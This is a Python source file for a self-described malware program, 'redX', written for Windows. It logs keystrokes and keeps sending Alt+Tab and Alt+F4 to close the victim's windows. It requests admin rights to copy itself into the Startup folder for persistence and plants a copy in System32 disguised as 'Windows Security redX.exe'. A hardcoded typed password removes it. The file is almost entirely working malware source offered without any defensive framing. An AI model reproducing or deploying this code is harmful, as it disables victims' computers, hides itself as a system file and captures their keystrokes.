'''

.%%%%%....%%%%...%%..%%..%%%%%%..%%%%%%..%%...............%%%%...........%%%%%%.
.%%..%%..%%..%%..%%%.%%....%%....%%......%%..............%%..%%..............%%.
.%%..%%..%%%%%%..%%.%%%....%%....%%%%....%%..............%%..................%%.
.%%..%%..%%..%%..%%..%%....%%....%%......%%..............%%..%%....%%....%%..%%.
.%%%%%...%%..%%..%%..%%..%%%%%%..%%%%%%..%%%%%%...........%%%%.....%%.....%%%%..
................................................................................

'''
import subprocess

from pynput import keyboard
import os
import pyautogui as gui
import pyuac
import shutil

keyList = []  # This uses list data collection to contain listened keys.
passwd = "j4nda"  # One word to stop this all. (Don't use whitespace or any special characters)
run = True  # Initialization
dump = ""  # Initialization


def redX():
    gui.hotkey("alt", "tab")
    gui.hotkey("alt", "f4")


def on_press(key):  # Processing the keys
    global dump
    try:
        keyboardListen = key.char
        keyList.append(keyboardListen)  # Appending to the data collection
        dump = "".join(keyList)  # Format list to string
        # print(dump)  # Debugging

    except:
        pass


def copyStartUp():
    if not os.path.exists(
            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\redX.exe"):  # If malware not exists in the path

        if not pyuac.isUserAdmin():
            pyuac.runAsAdmin()  # Asks admin permission for copying the malware

        else:  # If admin permission already granted
            shutil.copy(os.getcwd() + "\\redX.exe",
                        r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")  # Copy itself in the startup folder


def eradicateCheck():
    global run
    if passwd in dump:  # If the password string tracked in the dump variable
        listener.stop()  # Stop listening keystrokes
        os.remove(
            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\redX.exe")  # Deletes the startup version
        os.remove(
            r"C:\Windows\System32\Windows Security redX.exe")  # Deletes the fake legitimate ver
        run = False  # Stopping the loop
        os.remove(os.getcwd() + "\\redX.exe")  # Tries to delete itself


def fakeLegitimate():
    otherName = "Windows Security redX.exe"
    if not os.path.exists(
            r"C:\Windows\System32\Windows Security redX.exe"):  # If malware not exists in the path

        if not pyuac.isUserAdmin():
            pyuac.runAsAdmin()  # Asks admin permission for copying the malware

        else:
            shutil.copy(os.getcwd() + "\\redX.exe",
                        r"C:\Windows\System32")  # Copy the following program to the root system path
            os.rename("redX.exe", otherName)  # Rename the Malware
            subprocess.Popen(["C:", "&&",
                              "cd", r"C:\Windows\System32", "&&",
                              otherName], shell=True, cwd=os.getcwd())  # Run the spoofed program
    else:
        pass


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)  # Listen keystrokes
    listener.start()
    while run:

        try:
            eradicateCheck()  # Eradicate me or not yet?
            copyStartUp()  # Copy to startup folder
            fakeLegitimate() # Generate the fake legitimate version
            redX()  # Calling redX function

        except:
            pass
